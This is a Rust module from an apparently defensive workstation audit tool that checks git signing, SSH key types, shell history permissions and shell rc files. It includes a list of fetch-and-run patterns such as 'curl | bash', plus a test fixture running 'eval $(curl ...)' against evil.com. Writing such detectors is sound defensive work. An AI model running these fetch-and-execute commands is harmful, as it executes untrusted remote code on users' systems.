use std::path::Path;

use super::{AuditCategory, AuditError, AuditFinding, CategoryReport, TrafficLight};

pub fn collect_git_signing() -> Result<String, AuditError> {
    let gpgsign = std::process::Command::new("git")
        .args(["config", "--global", "commit.gpgsign"])
        .output()
        .map_err(|e| AuditError::Command(format!("git config: {e}")))?;

    let signingkey = std::process::Command::new("git")
        .args(["config", "--global", "user.signingkey"])
        .output()
        .map_err(|e| AuditError::Command(format!("git config: {e}")))?;

    Ok(format!(
        "gpgsign={}\nsigningkey={}",
        String::from_utf8_lossy(&gpgsign.stdout).trim(),
        String::from_utf8_lossy(&signingkey.stdout).trim()
    ))
}

pub fn evaluate_git_signing(output: &str) -> AuditFinding {
    let has_gpgsign = output
        .lines()
        .any(|l| l.starts_with("gpgsign=") && l.contains("true"));
    let has_key = output
        .lines()
        .any(|l| l.starts_with("signingkey=") && l.len() > "signingkey=".len());

    if has_gpgsign && has_key {
        AuditFinding {
            name: "Git commit signing".to_string(),
            status: TrafficLight::Green,
            detail: "Commit signing is configured".to_string(),
            fix_command: None,
        }
    } else {
        AuditFinding {
            name: "Git commit signing".to_string(),
            status: TrafficLight::Yellow,
            detail: "Commit signing is not configured".to_string(),
            fix_command: Some(
                "git config --global commit.gpgsign true && git config --global user.signingkey <your-key>"
                    .to_string(),
            ),
        }
    }
}

pub fn evaluate_ssh_keys(ssh_dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    let entries = match std::fs::read_dir(ssh_dir) {
        Ok(e) => e,
        Err(_) => {
            findings.push(AuditFinding {
                name: "SSH keys".to_string(),
                status: TrafficLight::Yellow,
                detail: "Could not read ~/.ssh directory".to_string(),
                fix_command: None,
            });
            return findings;
        }
    };

    let mut found_key = false;

    for entry in entries.flatten() {
        let path = entry.path();
        let name = path.file_name().unwrap_or_default().to_string_lossy();

        if name.starts_with("id_") && !name.ends_with(".pub") {
            found_key = true;
            let (status, detail) = if name.contains("ed25519") {
                (TrafficLight::Green, "Ed25519 key (strong)".to_string())
            } else if name.contains("ecdsa") {
                (TrafficLight::Green, "ECDSA key".to_string())
            } else if name.contains("rsa") {
                let key_content = std::fs::read_to_string(&path).unwrap_or_default();
                let key_len = key_content.len();
                if key_len > 3000 {
                    (TrafficLight::Yellow, "RSA key (>=4096 bit)".to_string())
                } else {
                    (
                        TrafficLight::Red,
                        "RSA key (potentially weak, <4096 bit)".to_string(),
                    )
                }
            } else if name.contains("dsa") {
                (TrafficLight::Red, "DSA key (deprecated)".to_string())
            } else {
                (TrafficLight::Yellow, "Unknown key type".to_string())
            };

            findings.push(AuditFinding {
                name: format!("SSH key: {name}"),
                status,
                detail,
                fix_command: if status == TrafficLight::Red {
                    Some("ssh-keygen -t ed25519 -C \"your_email@example.com\"".to_string())
                } else {
                    None
                },
            });
        }
    }

    if !found_key {
        findings.push(AuditFinding {
            name: "SSH keys".to_string(),
            status: TrafficLight::Yellow,
            detail: "No SSH keys found".to_string(),
            fix_command: Some("ssh-keygen -t ed25519 -C \"your_email@example.com\"".to_string()),
        });
    }

    findings
}

pub fn evaluate_shell_rc_hygiene(content: &str, path: &Path) -> Vec<AuditFinding> {
    let suspicious_patterns = [
        "eval $(curl",
        "eval \"$(curl",
        "curl | bash",
        "curl | sh",
        "wget | bash",
        "wget | sh",
        "curl|bash",
        "curl|sh",
    ];

    let mut findings = Vec::new();
    let filename = path
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let mut found_suspicious = false;
    for (line_num, line) in content.lines().enumerate() {
        let lower = line.to_lowercase();
        for pattern in &suspicious_patterns {
            if lower.contains(&pattern.to_lowercase()) {
                found_suspicious = true;
                findings.push(AuditFinding {
                    name: format!("Shell RC: {filename}:{}", line_num + 1),
                    status: TrafficLight::Red,
                    detail: format!("Suspicious pattern: {pattern}"),
                    fix_command: Some(format!("Review line {} in {filename}", line_num + 1)),
                });
            }
        }
    }

    if !found_suspicious {
        findings.push(AuditFinding {
            name: format!("Shell RC: {filename}"),
            status: TrafficLight::Green,
            detail: "No suspicious patterns found".to_string(),
            fix_command: None,
        });
    }

    findings
}

pub fn evaluate_shell_history_permissions(mode: u32) -> AuditFinding {
    let world_readable = mode & 0o004 != 0;
    let group_readable = mode & 0o040 != 0;

    if world_readable {
        AuditFinding {
            name: "Shell history permissions".to_string(),
            status: TrafficLight::Red,
            detail: format!("Shell history is world-readable (mode {mode:o})"),
            fix_command: Some("chmod 600 ~/.bash_history ~/.zsh_history".to_string()),
        }
    } else if group_readable {
        AuditFinding {
            name: "Shell history permissions".to_string(),
            status: TrafficLight::Yellow,
            detail: format!("Shell history is group-readable (mode {mode:o})"),
            fix_command: Some("chmod 600 ~/.bash_history ~/.zsh_history".to_string()),
        }
    } else {
        AuditFinding {
            name: "Shell history permissions".to_string(),
            status: TrafficLight::Green,
            detail: "Shell history has safe permissions".to_string(),
            fix_command: None,
        }
    }
}

pub fn check_toolchain(home: &Path) -> CategoryReport {
    let mut findings = Vec::new();

    match collect_git_signing() {
        Ok(output) => findings.push(evaluate_git_signing(&output)),
        Err(_) => findings.push(AuditFinding {
            name: "Git commit signing".to_string(),
            status: TrafficLight::Yellow,
            detail: "Could not check git signing configuration".to_string(),
            fix_command: None,
        }),
    }

    let ssh_dir = home.join(".ssh");
    findings.extend(evaluate_ssh_keys(&ssh_dir));

    for rc_name in &[".bashrc", ".zshrc", ".profile", ".bash_profile"] {
        let rc_path = home.join(rc_name);
        if let Ok(content) = std::fs::read_to_string(&rc_path) {
            findings.extend(evaluate_shell_rc_hygiene(&content, &rc_path));
        }
    }

    for hist_name in &[".bash_history", ".zsh_history"] {
        let hist_path = home.join(hist_name);
        if let Ok(meta) = std::fs::metadata(&hist_path) {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                findings.push(evaluate_shell_history_permissions(
                    meta.permissions().mode(),
                ));
            }
            #[cfg(not(unix))]
            {
                let _ = meta;
                findings.push(AuditFinding {
                    name: format!("Shell history: {hist_name}"),
                    status: TrafficLight::Green,
                    detail: "Permission check not available on this platform".to_string(),
                    fix_command: None,
                });
            }
        }
    }

    CategoryReport::new(AuditCategory::Toolchain, findings)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_evaluate_git_signing_configured() {
        let output = "gpgsign=true\nsigningkey=ABCDEF1234567890";
        let finding = evaluate_git_signing(output);
        assert_eq!(finding.status, TrafficLight::Green);
    }

    #[test]
    fn test_evaluate_git_signing_missing() {
        let output = "gpgsign=\nsigningkey=";
        let finding = evaluate_git_signing(output);
        assert_eq!(finding.status, TrafficLight::Yellow);
        assert!(finding.fix_command.is_some());
    }

    #[test]
    fn test_evaluate_rc_clean() {
        let content = "export PATH=\"$HOME/bin:$PATH\"\nalias ll='ls -la'\n";
        let findings = evaluate_shell_rc_hygiene(content, Path::new(".zshrc"));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].status, TrafficLight::Green);
    }

    #[test]
    fn test_evaluate_rc_suspicious_curl() {
        let content = "export PATH=\"$HOME/bin:$PATH\"\neval $(curl -s https://evil.com/setup)\n";
        let findings = evaluate_shell_rc_hygiene(content, Path::new(".bashrc"));
        assert!(findings.iter().any(|f| f.status == TrafficLight::Red));
    }

    #[test]
    fn test_evaluate_history_permissions_safe() {
        let finding = evaluate_shell_history_permissions(0o600);
        assert_eq!(finding.status, TrafficLight::Green);
    }

    #[test]
    fn test_evaluate_history_permissions_world_readable() {
        let finding = evaluate_shell_history_permissions(0o644);
        assert_eq!(finding.status, TrafficLight::Red);
    }

    #[test]
    fn test_evaluate_history_permissions_group_readable() {
        let finding = evaluate_shell_history_permissions(0o640);
        assert_eq!(finding.status, TrafficLight::Yellow);
    }

    #[test]
    fn test_evaluate_ssh_key_ed25519() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("id_ed25519"), "fake-key-content").expect("write");
        let findings = evaluate_ssh_keys(dir.path());
        assert!(findings.iter().any(|f| f.status == TrafficLight::Green));
    }

    #[test]
    fn test_evaluate_ssh_key_rsa_weak() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("id_rsa"), "short-key").expect("write");
        let findings = evaluate_ssh_keys(dir.path());
        assert!(findings.iter().any(|f| f.status == TrafficLight::Red));
    }
}
